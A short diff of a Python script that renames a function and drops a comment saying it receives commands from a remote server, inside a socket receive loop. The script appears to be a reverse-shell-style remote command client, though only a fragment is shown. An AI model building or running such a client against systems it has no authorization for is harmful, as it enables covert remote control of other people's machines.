@@ -27,8 +27,7 @@ def socket_connect():
         print("Socket connection error: " + str(msg))
 
 
-# Recieve commands from remote server 
-def commands():
+def command_line():
     global s
     while True:
         data = s.recv(1024)
